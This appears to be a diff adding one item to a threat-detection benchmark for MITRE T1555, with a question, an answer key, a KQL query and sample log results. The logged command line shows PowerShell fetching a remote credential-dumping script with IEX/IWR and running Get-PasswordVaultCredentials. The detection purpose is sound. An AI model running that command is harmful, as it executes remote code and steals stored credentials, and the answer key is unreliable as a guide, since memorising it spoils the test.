@@ -1,0 +1,34 @@
+{
+    "technique_id": "T1555",
+    "question_id": "c89becbe-1758-4e7d-a0f4-97d2188a23e3",
+    "context": "A Windows endpoint where an attacker may use PowerShell to extract stored credentials from the local vault.",
+    "objective": "Detect PowerShell activity that downloads and invokes a remote script to dump Credential Manager entries.",
+    "technical_details": {
+        "command_analysis": "The adversary runs an IWR call to fetch a PS1 file named GetCredmanCreds.ps1 and then invokes it, followed by Get-PasswordVaultCredentials.",
+        "detection_approach": "Search process creation logs for PowerShell commands containing both IWR (Invoke-WebRequest) targeting a .ps1 file and the Get-PasswordVaultCredentials cmdlet."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question to focus on identifying the downloaded script name, since that reveals the tool used to extract vault credentials.",
+    "prompt": "On Windows, review PowerShell process events to spot where a remote .ps1 was fetched and run to pull vault credentials. Determine the name of the script file that was downloaded.",
+    "answer": [
+        "GetCredmanCreds.ps1"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName in (\"powershell.exe\",\"pwsh.exe\")\n// Look for Invoke-WebRequest or its alias downloading a .ps1\n| where tolower(ProcessCommandLine) has \"iwr\" and tolower(ProcessCommandLine) has \".ps1\"\n// Look for the credential-vault dumping function\n| where tolower(ProcessCommandLine) has \"get-passwordvaultcredentials\"\n// Extract the downloaded script name to verify it’s the expected tool\n| extend ScriptName = extract(@\"(?i)\\b(GetCredmanCreds\\.ps1)\\b\", 1, ProcessCommandLine)\n| where isnotempty(ScriptName)\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ScriptName, ProcessCommandLine",
+    "KQL_validation_message": "KQL query validation successful: The expected answer is 'GetCredmanCreds.ps1'. In the query results, under the 'ScriptName' column, 'GetCredmanCreds.ps1' is present. This provides explicit evidence that the activity related to the expected script execution is captured in the results, thus they contain the necessary information to answer the detection question.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ScriptName",
+            "ProcessCommandLine"
+        ],
+        [
+            "2025-05-07 17:04:29.790972+00:00",
+            "windows-vm",
+            "wipro",
+            "GetCredmanCreds.ps1",
+            "\"powershell.exe\" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force}"
+        ]
+    ]
+}
